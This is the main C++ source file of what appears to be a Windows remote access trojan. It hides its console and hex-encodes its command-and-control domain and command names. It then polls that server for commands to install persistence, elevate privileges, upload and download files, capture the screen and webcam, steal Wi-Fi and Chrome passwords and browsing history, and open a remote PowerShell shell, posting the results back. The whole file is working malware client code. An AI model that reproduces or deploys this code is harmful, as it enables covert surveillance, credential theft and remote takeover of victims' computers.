#include <iostream>
#include <string>
#include <Windows.h>
#include <stdio.h>
#include <winhttp.h>
#include <vector>
#include<thread> 

#include "iostream"
#include "string"
#include "HttpRequests.h"
#include "ScreenFunctions.h"
#include "Utils.h"
#include "ConnectionFunctions.h"
#include "Wifi.h"
#include "Encryptions.h"
#include "SystemInformation.h"
#include "Execute.h"
#include "Persistence.h"
#include "Chrome.h"
#include "Elevate.h"
#include "Powershell.h"
#include "Smile.h"


using namespace std;

#ifdef _DEBUG
	//const string domain = "127.0.0.1";
	const string domain = Encryptions::hexToAscii("Enter your hex encoded Domain\IP here");

#else
	const string domain = Encryptions::hexToAscii("636f7669646672616d65776f726b2e636f6d");
#endif


int main()
{
	ConnectionFunctions ConnectionFunctions;
#ifdef _DEBUG
		//hide window if in release
#else
	HWND stealth;
	AllocConsole();
	stealth = FindWindowA("ConsoleWindowClass", NULL);
	ShowWindow(stealth, 0);
	while (!ConnectionFunctions.GetConnectionState())
	{
		Sleep(4000);
	}
#endif
	extern string mainDirectory;
	vector<std::thread> threads;
	UploadDownload DownloadUpload;
	HttpRequests WinHttpRequests;
	Wifi wifi;
	Elevate elevate;
	Chrome chrome;
	ScreenFunctions Cheese;
	Powershell powershell;
	PublicStructers::client clientInfo;
	PublicStructers::ClientSession ClientSessionStructer;
	Smile smile;
	int id = 0;
	Utils::CreateMainDirectory();
	HINTERNET ClientSessionWinHttp = WinHttpRequests.createFirstConnection((LPCWSTR)Utils::s2ws(domain).c_str());
	if (ClientSessionWinHttp == NULL)
	{
		return 1;
	}
	GetInfoLocal GetInfoLocal(ClientSessionWinHttp);
	clientInfo = GetInfoLocal.get_local_info();
	ClientSessionStructer = ConnectionFunctions.ToolAuth(clientInfo, ClientSessionWinHttp);
	clientInfo.clientId = ClientSessionStructer.clientId;
	clientInfo.session = ClientSessionStructer.session;
	if (clientInfo.ifWifi)
	{
		try
		{
			threads.push_back(thread(&Wifi::SendLocationThread, &wifi, ClientSessionStructer));
		}
		catch (exception)
		{
#ifdef _DEBUG
			Utils::ErrorHandeling(string(__FUNCTION__) + "-" + to_string(__LINE__));
#endif
		}
	}
	typedef std::unique_ptr< std::thread >   threadptr;
	std::vector< threadptr >  openThreads;
	for (auto& th : threads)
		th.join();
	do
	{
		string finalData = "";
		string commandArgument = "";
		string responseFromServer = "";
		string hxcer = WinHttpRequests.SendGetRequest(Encryptions::hexToAscii("2F746F6F6C2F636F6D6D616E64732F6832"), ClientSessionWinHttp, clientInfo.clientId).c_str();
		hxcer = Encryptions::base64Decode(hxcer);
#ifdef _DEBUG
		cout << hxcer << endl;
#endif
		if (hxcer == Encryptions::hexToAscii("4e6f20636f6d6d616e64"))
			Sleep(3000);
#ifdef _DEBUG
		//stayhome
#endif
		else if (hxcer == Encryptions::hexToAscii("73746179686f6d65"))
		{
			try
			{
				Persistence StayHome(clientInfo);
				thread staytask(&Persistence::CreateTask, &StayHome, Encryptions::hexToAscii("433a5c50726f6772616d44617461"));
				staytask.join();
				finalData = Encryptions::hexToAscii("53746179486f6d652073756363656564656421");
			}
			catch (exception)
			{
			#ifdef _DEBUG
				Utils::ErrorHandeling(string(__FUNCTION__) + "-" + to_string(__LINE__));
			#endif
				finalData = Encryptions::hexToAscii("53746179486f6d65206661696c656421");
			}
			WinHttpRequests.SendPostData(JsonFunctions::CreatePostJson(finalData), clientInfo.session, Encryptions::hexToAscii("2F746F6F6C2F726573706F6E73652F"), clientInfo.clientId);
		}
#ifdef _DEBUG
		//exit
#endif
		else if (hxcer == Encryptions::hexToAscii("65786974"))
		{
			Utils::CleanUp(mainDirectory);
			WinHttpCloseHandle(clientInfo.session);
			break;
		}
#ifdef _DEBUG
		//elevate
#endif
		else if (hxcer == Encryptions::hexToAscii("656c6576617465"))
		{
			try
			{
				thread gohigherthread(&Elevate::GoHigherExecute, &elevate);
				gohigherthread.join();
				finalData = Encryptions::hexToAscii("476f4869676865722073756363656564656421");
				WinHttpRequests.SendPostData(JsonFunctions::CreatePostJson(finalData), clientInfo.session, Encryptions::hexToAscii("2F746F6F6C2F726573706F6E73652F"), clientInfo.clientId);
			}
			catch (exception)
			{
				finalData = Encryptions::hexToAscii("476F486967686572206661696C656421");
			}
			WinHttpRequests.SendPostData(JsonFunctions::CreatePostJson(finalData), clientInfo.session, Encryptions::hexToAscii("2F746F6F6C2F726573706F6E73652F"), clientInfo.clientId);
		}
#ifdef _DEBUG
		//upload
#endif
		else if (hxcer.substr(0, 6) == Encryptions::hexToAscii("75706c6f6164"))
		{
			try
			{
				commandArgument = hxcer.substr(7);
				thread downloadFile(&UploadDownload::downloadToClientThread, &DownloadUpload, commandArgument, clientInfo);
				downloadFile.join();
			}
			catch (exception)
			{
				finalData = Encryptions::hexToAscii("4661696c656420746f2075706c6f61642066696c6521");
				WinHttpRequests.SendPostData(JsonFunctions::CreatePostJson(finalData), clientInfo.session, Encryptions::hexToAscii("2F746F6F6C2F726573706F6E73652F"), clientInfo.clientId);
			}
		}
#ifdef _DEBUG
		//download
#endif
		else if (hxcer.substr(0, 8) == Encryptions::hexToAscii("646f776e6c6f6164"))
		{
			try
			{
				commandArgument = hxcer.substr(9);
				thread uploadFile(&UploadDownload::uploadToServerThread, &DownloadUpload, commandArgument, clientInfo);
				uploadFile.join();
			}
			catch (exception)
			{
				finalData = Encryptions::hexToAscii("4661696c656420746f20646f776e6c6f61642066696c6521");
				WinHttpRequests.SendPostData(JsonFunctions::CreatePostJson(finalData), clientInfo.session, Encryptions::hexToAscii("2F746F6F6C2F726573706F6E73652F"), clientInfo.clientId);
			}
		}
#ifdef _DEBUG
		//capture
#endif
		else if (hxcer == Encryptions::hexToAscii("63617074757265"))
		{
			try
			{

				id += 1;
				thread cheese(&ScreenFunctions::startCaptureThread, &Cheese, mainDirectory, clientInfo, id);
				cheese.join();
			}
			catch (exception)
			{
				finalData = Encryptions::hexToAscii("4661696c656420746f20636170747572652073637265656e21");
				WinHttpRequests.SendPostData(JsonFunctions::CreatePostJson(finalData), clientInfo.session, Encryptions::hexToAscii("2F746F6F6C2F726573706F6E73652F"), clientInfo.clientId);
			}
		}
#ifdef _DEBUG
		//getwifi
#endif
		else if (hxcer == Encryptions::hexToAscii("67657477696669"))
		{
			try
			{
				thread getWifi(&Wifi::GetWifiPasswordsThread, &wifi, clientInfo);
				getWifi.join();
			}
			catch (exception)
			{
				finalData = Encryptions::hexToAscii("4661696c656420746f2067657420776966692070617373776f72647321");
				WinHttpRequests.SendPostData(JsonFunctions::CreatePostJson(finalData), clientInfo.session, Encryptions::hexToAscii("2F746F6F6C2F726573706F6E73652F"), clientInfo.clientId);
			}
		}
#ifdef _DEBUG
		//webPass
#endif
		else if (hxcer == Encryptions::hexToAscii("77656250617373"))
		{
			try
			{
				thread getWifi(&Chrome::x81kiw23, &chrome, clientInfo);
				getWifi.join();
			}
			catch (exception)
			{
				finalData = Encryptions::hexToAscii("4661696c656420746f206765742077656250617373776f72647321");
				WinHttpRequests.SendPostData(JsonFunctions::CreatePostJson(finalData), clientInfo.session, Encryptions::hexToAscii("2F746F6F6C2F726573706F6E73652F"), clientInfo.clientId);
			}
		}
#ifdef _DEBUG
		//get-network
#endif
		else if (hxcer == Encryptions::hexToAscii("6765742d6e6574776f726b"))
		{
			finalData = GetInfoLocal.full_network_info();
			WinHttpRequests.SendPostData(JsonFunctions::CreatePostJson(finalData), clientInfo.session, Encryptions::hexToAscii("2F746F6F6C2F726573706F6E73652F"), clientInfo.clientId);

		}
#ifdef _DEBUG
		//change-image
#endif
		else if (hxcer.substr(0, 12) == Encryptions::hexToAscii("6368616e67652d696d616765"))
		{
			try
			{
				commandArgument = hxcer.substr(13);
				thread changeImage(&ScreenFunctions::startChangeBackgroundThread, &Cheese, commandArgument, clientInfo);
				changeImage.join();
			}
			catch (exception)
			{
				finalData = Encryptions::hexToAscii("4661696c656420746f206368616e6765206261636b67726f756e6421");
				WinHttpRequests.SendPostData(JsonFunctions::CreatePostJson(finalData), clientInfo.session, Encryptions::hexToAscii("2F746F6F6C2F726573706F6E73652F"), clientInfo.clientId);
			}
		}
#ifdef _DEBUG
		//StartPS
#endif
		else if (hxcer == Encryptions::hexToAscii("53746172745053"))
		{
			finalData = Encryptions::hexToAscii("4661696c656420746f206f70656e20505321");
			try
			{
				thread startPS(&Powershell::CreateShell,&powershell, clientInfo);
				startPS.join();
				continue;
			}
			catch (exception)
			{
				WinHttpRequests.SendPostData(JsonFunctions::CreatePostJson(finalData), clientInfo.session, Encryptions::hexToAscii("2F746F6F6C2F726573706F6E73652F"), clientInfo.clientId);
			}
		}
#ifdef _DEBUG
		//PromptUser
#endif
		else if (hxcer == Encryptions::hexToAscii("50726f6d707455736572"))
		{
			finalData = Encryptions::hexToAscii("4661696c656420746f206578656375746521");
			try
			{
				thread execute(&Execute::PromptUser, clientInfo);
				execute.detach();
			}
			catch (exception)
			{
				WinHttpRequests.SendPostData(JsonFunctions::CreatePostJson(finalData), clientInfo.session, Encryptions::hexToAscii("2F746F6F6C2F726573706F6E73652F"), clientInfo.clientId);
			}
		}
#ifdef _DEBUG
		//Camera capture
#endif
		else if (hxcer == Encryptions::hexToAscii("736d696c65"))
		{
			finalData = Encryptions::hexToAscii("4661696c656420746f206578656375746521");
			try
			{
				string fileName = Encryptions::hexToAscii("43616D657261") + to_string(id) + Encryptions::hexToAscii("2E6A7067");
				id += 1;
				thread pic(&Smile::TakePictureAction,&smile, fileName, clientInfo);
				pic.detach();
			}
			catch (exception)
			{
				WinHttpRequests.SendPostData(JsonFunctions::CreatePostJson(finalData), clientInfo.session, Encryptions::hexToAscii("2F746F6F6C2F726573706F6E73652F"), clientInfo.clientId);
			}
		}
#ifdef _DEBUG
		//Downlaod history DB
#endif
		else if (hxcer == Encryptions::hexToAscii("686973746F7279"))
		{
			finalData = Encryptions::hexToAscii("4661696C656420746F20646F776E6C6F61642044422066696C65");
			try
			{
				thread history(&Chrome::DownloadHistoryDB, &chrome, clientInfo);
				history.detach();
			}
			catch (exception)
			{
				WinHttpRequests.SendPostData(JsonFunctions::CreatePostJson(finalData), clientInfo.session, Encryptions::hexToAscii("2F746F6F6C2F726573706F6E73652F"), clientInfo.clientId);
			}
		}
	} while (true);
	return 0;
}

